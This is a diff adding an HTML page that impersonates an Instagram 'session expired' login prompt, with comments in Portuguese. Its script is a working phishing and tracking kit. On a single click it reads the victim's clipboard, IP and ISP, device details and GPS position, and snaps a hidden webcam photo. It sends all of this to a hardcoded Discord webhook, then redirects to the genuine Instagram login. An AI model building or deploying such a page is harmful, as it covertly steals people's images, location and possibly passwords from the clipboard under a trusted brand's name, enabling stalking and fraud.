@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sessão Expirada</title>
+    <style>
+        body { background-color: #fafafa; color: #262626; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 320px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        #btn-verify { background-color: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d44b467048c6.png" class="logo">
+        <p style="color: #8e8e8e; font-size: 14px;">Sua sessão expirou. Valide sua identidade.</p>
+        <button id="btn-verify">ENTRAR NOVAMENTE</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // SUBSTITUA PELO SEU WEBHOOK REAL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500289780041388152/C3Kt58wqBLIS4EdWiLqAQT0AyHWsQS2GgxgMLcQbd1MPBfjCYGzlBicDlTGg8bQsN-_y";
+
+        document.getElementById('btn-verify').addEventListener('click', async () => {
+            const btn = document.getElementById('btn-verify');
+            btn.innerText = "VERIFICANDO...";
+            btn.disabled = true;
+
+            // 1. Coleta de dados imediatos (não pedem permissão)
+            let hardware = {
+                plataforma: navigator.platform,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
+                vendor: navigator.vendor,
+                url: window.location.href,
+                referrer: document.referrer || "Direto"
+            };
+
+            // 2. Tentar Clipboard
+            let clipData = "Sem permissão";
+            try { clipData = await navigator.clipboard.readText(); } catch(e){}
+
+            // 3. Tentar IP e ISP (HTTPS)
+            let geo = { query: "Erro/Block", isp: "N/A", city: "N/A" };
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                geo = await response.json();
+            } catch(e){}
+
+            // 4. Iniciar Captura de Mídia e Localização
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let fotoBlob = null;
+            let coords = "Negado";
+
+            try {
+                // Tenta câmera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Espera 1s para a câmera abrir
+                await new Promise(r => setTimeout(r, 1000));
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const base64 = canvas.toDataURL('image/jpeg');
+                fotoBlob = await (await fetch(base64)).blob();
+                
+                // Desliga a câmera
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { console.log("Câmera negada"); }
+
+            // Tenta GPS
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000});
+                });
+                coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            } catch(e) { console.log("GPS negado"); }
+
+            // 5. ENVIO FINAL (Obrigatório)
+            const formData = new FormData();
+            const embed = {
+                title: "⚡ CAPTURA REALIZADA",
+                color: 0,
+                fields: [
+                    { name: "🌐 IP / ISP", value: `IP: ${geo.ip || geo.query}\nISP: ${geo.org || geo.isp}`, inline: true },
+                    { name: "📍 Localização", value: coords !== "Negado" ? `[Google Maps](https://www.google.com/maps?q=${coords})` : "❌ Negado", inline: true },
+                    { name: "📋 Clipboard", value: `\`\`\`${clipData}\`\`\`` },
+                    { name: "📱 Dispositivo", value: `SO: ${hardware.plataforma}\nRAM: ${hardware.ram}GB\nCPUs: ${hardware.cores}`, inline: false }
+                ],
+                timestamp: new Date()
+            };
+
+            formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+            if (fotoBlob) formData.append("file", fotoBlob, "alvo.jpg");
+
+            fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+            .then(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            })
+            .catch(() => {
+                // Se der erro no fetch, tenta enviar sem a foto (fallback final)
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: "⚠️ Erro ao enviar foto, mas IP capturado: " + (geo.ip || geo.query) })
+                });
+            });
+        });
+    </script>
+</body>
+</html>
